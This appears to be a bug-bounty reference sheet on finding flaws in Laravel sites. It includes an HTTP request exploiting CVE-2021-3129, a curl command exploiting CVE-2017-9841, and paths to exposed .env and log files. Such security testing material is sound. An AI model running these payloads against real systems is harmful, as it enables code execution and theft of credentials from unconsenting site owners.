
## Introduction

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Laravel.md#introduction)

What would you do if you came across a website that uses Laravel?

## How to Detect

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Laravel.md#how-to-detect)

Usually in the HTTP response there is a header like this `Set-Cookie: laravel_session=`

1. Find the related CVE by checking laravel version

- How to find the laravel version

By checking the composer file in `https://example.com/composer.json`, sometimes the version is printed there. If you found outdated laravel version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-16542/product_id-38139/Laravel-Laravel.html)

Some example CVE:

- CVE-2021-3129 (Remote Code Execution)

```
POST /_ignition/execute-solution HTTP/1.1
Host: example.com
Accept: application/json
Content-Type: application/json

{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "cve20213129", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
```

2. Laravel 4.8.28 ~ 5.x - PHPUnit Remote Code Execution (CVE-2017-9841)

```
curl -d "<?php echo php_uname(); ?>" http://example.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

3. Exposed environment variables

- Full Path Exploit : [http://example.com/.env](http://example.com/.env)

[![Environment Variables](https://camo.githubusercontent.com/7e4b69ca20ec4619a6960458542dd68bdd04168d98283c78877aa41eea41e940/68747470733a2f2f312e62702e626c6f6773706f742e636f6d2f2d45555478675035584536512f586b6742345379575362492f41414141414141414151412f657174414c4f6a4c4b4b41343673692d6c496f736d366344566d7842796a7a4951434c63424741735948512f73313630302f312e706e67)](https://camo.githubusercontent.com/7e4b69ca20ec4619a6960458542dd68bdd04168d98283c78877aa41eea41e940/68747470733a2f2f312e62702e626c6f6773706f742e636f6d2f2d45555478675035584536512f586b6742345379575362492f41414141414141414151412f657174414c4f6a4c4b4b41343673692d6c496f736d366344566d7842796a7a4951434c63424741735948512f73313630302f312e706e67)

4. Exposed log files

- Full Path Exploit : [http://example.com/storage/logs/laravel.log](http://example.com/storage/logs/laravel.log)

5. Laravel Debug Mode Enabled

- Try to request to [https://example.com](https://example.com) using POST method (Error 405)
- Using [] in paramater (ex:example.com/param[]=0)

[![Laravel Debug Mode](https://camo.githubusercontent.com/bbbd5326a23af45fd1cefd96d0154f507ff2d5d27bbf0479dd05830faf000e1e/68747470733a2f2f6861636b656e2e696f2f77702d636f6e74656e742f75706c6f6164732f323031392f30372f6c61726176656c2d73637265656e2e706e67)](https://camo.githubusercontent.com/bbbd5326a23af45fd1cefd96d0154f507ff2d5d27bbf0479dd05830faf000e1e/68747470733a2f2f6861636b656e2e696f2f77702d636f6e74656e742f75706c6f6164732f323031392f30372f6c61726176656c2d73637265656e2e706e67)

## References

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Laravel.md#references)

- [Nakanosec](https://www.nakanosec.com/2020/02/common-bug-pada-laravel.html)

